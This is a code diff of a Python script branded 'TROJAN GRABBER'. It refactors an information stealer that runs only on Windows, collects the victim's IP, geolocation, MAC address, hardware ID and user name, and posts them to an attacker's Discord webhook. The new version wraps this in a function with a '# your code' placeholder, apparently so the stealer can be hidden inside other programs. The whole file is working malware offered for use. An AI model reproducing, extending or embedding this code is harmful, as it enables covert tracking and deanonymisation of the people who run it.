@@ -3,7 +3,7 @@ import re, uuid, requests, socket, subprocess, time
 import sys
 from datetime import datetime
 
-dcusername = "VICTIM_NAME"
+victim = "VICTIM_NAME"
 webh = "ENTER_WEBHOOK"
 
 """
@@ -22,8 +22,8 @@ webh = "ENTER_WEBHOOK"
          P.       ^BBJ7!?55Y~YBBBG57~!7YGP?: .^.                           
          5.     :?BG!     5##BGY7^.    .^~7YJ5BG                           
          7:    .BBB^    .YBG^..           ~GG5!5J                          
-         .!     ?#P    .PBG:  .!77JY?^ .!5Y~.  .GY                     TROJAN GRABBER BY TEKKY      
-          .     ~BY .  7#G:  7?~.  .?BG5~..^.   ^B^                    discord.gg/onlp    
+         .!     ?#P    .PBG:  .!77JY?^ .!5Y~.  .GY                   TROJAN GRABBER BY TEKKY      
+          .     ~BY .  7#G:  7?~.  .?BG5~..^.   ^B^                  Server: discord.gg/onlp    
                .^PBP.  5BB. 7?       :BPYJPBG^.  55                        
               ^^^JBB^  YBB:         .!BBP!7J5GGY?GG                        
                ^!?GBG^ .GBG~ ..:^  !GGGBBY?~:.:7GBG.                       
@@ -40,43 +40,57 @@ webh = "ENTER_WEBHOOK"
               .:.                                                         
 """
 
-if os.name != "nt":
-    sys.exit()
 
-#-------------------* info *-------------------#
-mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
-hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
-pcname = os.path.expanduser("~")[9:]
-ip = requests.get('https://api.ipify.org/').text
-data = requests.get(f"http://ip-api.com/json/{ip}").json()
+def grabber():
+    if os.name != "nt":
+        sys.exit()
+
+    try:
+        # -------------------* info *-------------------#
+        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
+        hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
+        pcname = os.path.expanduser("~")[9:]
+        ip = requests.get('https://api.ipify.org/').text
+        data = requests.get(f"http://ip-api.com/json/{ip}").json()
+
+        # -------------------* hook *-------------------#
+        requests.post(webh, json={
+            "content": "None",
+            "embeds": [
+                {
+                    "title": f"{victim} | IP: {ip}",
+                    "description": f"**Location**"
+                                   f"```python"
+                                   f"Country: {data['country']} |  Region: {data['regionName']} | City: {data['city']}"
+                                   f"Lat: {data['lat']} | Lon: {data['lon']} \nISP: {data['isp']}"
+                                   f"ORG: {data['org']}"
+                                   f"AS: {data['as']}"
+                                   f"MAC: {mac}"
+                                   f"HWID: {hwid}"
+                                   f"PC-USER: {pcname}```"
+                                   f"**Time Started:** "
+                                   f"```python"
+                                   f"{datetime.now().strftime('%H:%M:%S')}\n```",
+                    "color": 5814783,
+                    "footer": {
+                        "text": "IP GRABBER BY Whaxor#9999 | Skid Proof",
+                        "icon_url": "https://toppng.com/uploads/preview/drawn-logo-vans-cool-logos-easy-to-draw-11563244767orfuvwe9u4.png"
+                    },
+                    "timestamp": str(datetime.utcnow())
+                }
+            ]
+
+        }
+    )
+    
+    except:
+        try:
+            requests.post(webh, json={"content": f"Failed to grab {victim}"})
+        except:
+            pass
 
 
-#-------------------* hook *-------------------#
-requests.post(webh, json={
-      "content": "None",
-      "embeds": [
-            {
-                "title": f"{dcusername} | IP: {ip}",
-                "description": f"**Location**"
-                               f"```python"
-                               f"Country: {data['country']} |  Region: {data['regionName']} | City: {data['city']}"
-                               f"Lat: {data['lat']} | Lon: {data['lon']} \nISP: {data['isp']}"
-                               f"ORG: {data['org']}"
-                               f"AS: {data['as']}"
-                               f"MAC: {mac}"
-                               f"HWID: {hwid}"
-                               f"PC-USER: {pcname}```"
-                               f"**Time Started:** "
-                               f"```python"
-                               f"{datetime.now().strftime('%H:%M:%S')}\n```",
-                "color": 5814783,
-                "footer": {
-                    "text": "IP GRABBER BY Whaxor#9999 | Skid Proof",
-                    "icon_url": "https://toppng.com/uploads/preview/drawn-logo-vans-cool-logos-easy-to-draw-11563244767orfuvwe9u4.png"
-                },
-                "timestamp": str(datetime.utcnow())
-            }
-      ]
-
-    }
-)
+if __name__ == "__main__":
+    grabber()
+    
+    # your code
